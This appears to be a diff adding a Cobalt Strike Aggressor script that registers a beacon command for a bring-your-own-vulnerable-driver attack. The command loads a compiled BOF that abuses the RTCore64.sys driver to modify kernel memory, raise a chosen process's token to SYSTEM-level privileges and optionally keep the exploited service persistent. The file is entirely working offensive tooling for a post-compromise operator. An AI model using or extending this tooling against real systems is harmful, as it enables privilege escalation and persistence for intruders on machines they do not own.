@@ -1,0 +1,34 @@
+# author @mooolight
+
+beacon_command_register(
+	"byovd-rtcore64-tokenconf-unrestricttoken", "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.",
+	"INFO:\nCapabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.\n\n" .
+	"ARGUMENTS:\n[<targetProc>]: Target process for the action parameter.\n[<pers>]: Set the status of the service' persistence.\n\n" .
+	"USAGE:\nbyovd-rtcore64-tokenconf-unrestricttoken <targetProc> <pers>\n\n".
+	"EXAMPLES:\nbyovd-rtcore64-tokenconf-unrestricttoken 7957 TRUE\n\n");
+
+alias byovd-rtcore64-tokenconf-unrestricttoken {
+    $bid = $1;
+	$targetProc = $2;
+    $pers = $3;
+    
+	if ($targetProc eq "") {
+        berror($bid, "Please specify the target process to modify either the elevation or token privilege(s).\n");
+        return;
+    }
+    if ($pers eq "") {
+        berror($bid, "Please specify whether the exploited service will persist or not.\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("byovd-rtcore64-tokenconf-unrestricttoken-bof.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid,"zz",$targetProc,$pers);
+
+    blog($bid, "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
